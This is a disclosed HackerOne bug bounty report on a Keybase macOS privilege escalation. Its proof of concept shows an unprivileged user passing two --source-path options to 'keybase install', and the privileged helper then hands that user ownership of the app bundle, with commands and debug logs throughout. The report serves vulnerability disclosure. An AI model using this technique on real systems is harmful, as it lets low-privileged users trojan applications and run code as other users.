@@ -1,0 +1,128 @@
+ReportLink:https://hackerone.com/reports/471739
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/mirchr
+ReportedTo:Keybase(keybase)
+BountyAmount:1250.0
+Severity:medium
+State:Closed
+DateOfDisclosure:30.01.2019 18:33:06
+
+Summary:
+
+### Environment
+OS: macOS Mojave 10.14.1
+Kernel: Darwin Kernel Version 18.2.0
+
+keybase version 2.12.2-20181218171841+29273f4110
+
+### Steps to reproduce
+
+Note: All steps are executed as an unprivileged user unless otherwise noted.
+
+For this PoC the unprivileged user is defined as below
+```
+$ id test2
+uid=508(test2) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)
+```
+
+1) Show that the application files are owned by the admin user who installed it
+```
+$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/bin/keybase
+drwxr-xr-x@ 3 admin  admin        96 Dec 18 11:25 /Applications/Keybase.app
+-rwxr-xr-x@ 1 admin  admin     27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase
+-rwxr-xr-x@ 1 admin  admin  85209360 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/bin/keybase
+```
+
+2) Manually download the latest release version
+```
+wget https://prerelease.keybase.io/darwin-updates/Keybase-2.12.2-20181218171841%2B29273f4110.zip
+```
+3) Extract the application
+
+unzip Keybase-2.12.2-20181218171841+29273f4110.zip
+
+4) Execute the Keybase Application. Logging in is not necessary.
+```
+/Applications/Keybase.app/Contents/MacOS/Keybase # or use Finder
+```
+5) Execute keybase install pointing the source-path to the location of the unzipped application. The key here is to pass two --source-path options with the the first occurrence pointing to an invalid path.
+```
+# line breaks added for readability
+/Applications/Keybase.app/Contents/SharedSupport/bin/keybase -d install \
+-f \
+--source-path=/does/not/exist \
+-c app \
+--source-path=$PWD/Keybase.app
+```
+
+Log output
+```
+2018-12-24T11:39:03.086210-06:00 ▶ [DEBU keybase globals.go:491] 001 Created Identify2Cache, max age: 5m0s
+2018-12-24T11:39:03.086338-06:00 ▶ [DEBU keybase globals.go:494] 002 Created LinkCache, max size: 4000, clean dur: 1m0s
+2018-12-24T11:39:03.086395-06:00 ▶ [DEBU keybase globals.go:496] 003 Created CardCache, max age: 5m0s
+2018-12-24T11:39:03.086438-06:00 ▶ [DEBU keybase globals.go:514] 004 made a new full self cache
+2018-12-24T11:39:03.087220-06:00 ▶ [DEBU keybase globals.go:516] 005 made a new cached UPAK loader (timeout=10m0s)
+2018-12-24T11:39:03.091820-06:00 ▶ [DEBU keybase ui.go:614] 006 Setting GPG_TTY to /dev/ttys005
+2018-12-24T11:39:03.091980-06:00 ▶ [DEBU keybase secret_store.go:153] 007 NewSecretStoreLocked: using os-specific SecretStore
+2018-12-24T11:39:03.092051-06:00 ▶ [DEBU keybase globals.go:427] 008 Keybase CLI 2.12.2-20181218171841+29273f4110
+2018-12-24T11:39:03.092074-06:00 ▶ [DEBU keybase globals.go:427] 009 - Built with go1.10.3
+2018-12-24T11:39:03.092087-06:00 ▶ [DEBU keybase globals.go:427] 00a - Visit https://keybase.io for more details
+2018-12-24T11:39:03.100194-06:00 ▶ [DEBU keybase main.go:208] 00b + configureProcesses
+2018-12-24T11:39:03.100289-06:00 ▶ [DEBU keybase main.go:319] 00c + configureLogging
+2018-12-24T11:39:03.100327-06:00 ▶ [DEBU keybase main.go:328] 00d Disabling log forwarding
+2018-12-24T11:39:03.100343-06:00 ▶ [DEBU keybase main.go:321] 00e - configureLogging
+2018-12-24T11:39:03.100357-06:00 ▶ [DEBU keybase main.go:210] 00f - configureProcesses -> <nil>
+2018-12-24T11:39:03.100520-06:00 ▶ [DEBU keybase install_darwin.go:484] 010 Installing components: [app]
+2018-12-24T11:39:03.100586-06:00 ▶ [INFO keybase app.go:142] 011 Install app bundle
+2018-12-24T11:39:06.975310-06:00 ▶ [DEBU keybase app.go:77] 012 Output ([--debug --run-mode=prod --app-path=/Applications/Keybase.app --timeout=10 --install-app-bundle --source-path=/Users/test2/update/Keybase.app]): 12.24.2018 11:39:03.244 Installer:56[DEBG] Version: 1.1.64
+12.24.2018 11:39:03.277 KBInstaller:27[DEBG] Installables: (
+    "Privileged Helper",
+    App
+)
+12.24.2018 11:39:03.277 KBInstaller:32[DEBG] Install: Privileged Helper
+12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connecting to keybase.Helper (privileged=1)
+12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connected
+12.24.2018 11:39:03.499 KBHelperTool:118[DEBG] Helper version: {
+    build = 3;
+    version = "1.0.32";
+}
+12.24.2018 11:39:03.523 KBHelperTool:118[DEBG] Helper version: {
+    build = 3;
+    version = "1.0.32";
+}
+12.24.2018 11:39:03.532 KBInstaller:32[DEBG] Install: App
+12.24.2018 11:39:03.532 KBAppBundle:82[INFO] Checking security requirements
+12.24.2018 11:39:05.164 KBAppBundle:89[INFO] Copying app bundle /Users/test2/update/Keybase.app to /Applications/Keybase.app
+12.24.2018 11:39:05.544 KBAppBundle:98[INFO] Checking destination
+12.24.2018 11:39:06.969 KBInstaller:45[INFO] Install complete
+12.24.2018 11:39:06.969 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.32
+Version: 1.0.32
+12.24.2018 11:39:06.969 KBInstaller:49[INFO] App:
+12.24.2018 11:39:06.969 Installer:96[INFO] Exit(0)
+2018-12-24T11:39:06.975976-06:00 ▶ [DEBU keybase out_of_date.go:14] 013 + PrintOutOfDateWarnings
+2018-12-24T11:39:06.976240-06:00 ▶ [DEBU keybase socket.go:65] 014 + GetSocket
+2018-12-24T11:39:06.976593-06:00 ▶ [DEBU keybase rpc.go:25] 015 - GetSocket -> ok
+2018-12-24T11:39:06.976753-06:00 ▶ [DEBU keybase socket.go:75] 016 | empty socket wrapper; need a new one
+2018-12-24T11:39:06.976818-06:00 ▶ [DEBU keybase socket_nix.go:100] 017 + SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)
+2018-12-24T11:39:06.976889-06:00 ▶ [DEBU keybase socket_nix.go:124] 018 | net.Dial(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)
+2018-12-24T11:39:06.977905-06:00 ▶ [DEBU keybase socket_nix.go:125] 019 - SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock) -> ERROR: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory
+2018-12-24T11:39:06.977981-06:00 ▶ [DEBU keybase socket_nix.go:100] 01a + SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)
+2018-12-24T11:39:06.978016-06:00 ▶ [DEBU keybase socket_nix.go:124] 01b | net.Dial(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)
+2018-12-24T11:39:06.978187-06:00 ▶ [DEBU keybase socket_nix.go:125] 01c - SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock) -> ERROR: dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory
+2018-12-24T11:39:06.978270-06:00 ▶ [DEBU keybase socket.go:90] 01d | DialSocket -> ERROR: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory
+2018-12-24T11:39:06.978299-06:00 ▶ [DEBU keybase out_of_date.go:19] 01e Ignoring error in printOutOfDateWarnings: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory
+2018-12-24T11:39:06.978386-06:00 ▶ [DEBU keybase out_of_date.go:20] 01f - PrintOutOfDateWarnings
+2018-12-24T11:39:07.090071-06:00 ▶ [DEBU keybase globals.go:657] 020 GlobalContext#Shutdown(0xc4203a5400)
+2018-12-24T11:39:07.090332-06:00 ▶ [DEBU keybase globals.go:701] 021 exiting shutdown code=0; err=<nil>
+```
+6) Verify the permissions of keybase. The low privileged test2 user now owns all files under /Applications/Keybase.app. At this point the low privileged user has full control of all binaries and configuration files. These files could be modified by a malicious low privileged user to install a trojan horse to execute arbitrary code as an unsuspecting user. I believe there could also be a path to arbitrary code execution as root but additional research is necessary.
+```
+$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/
+drwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app
+-rwxr-xr-x  1 test2  staff  27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase
+drwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/
+```
+
+## Impact
+
+Arbitrary code execution as any user running Keybase is possible which impacts the confidentially, integrity, and availability of the system and users.
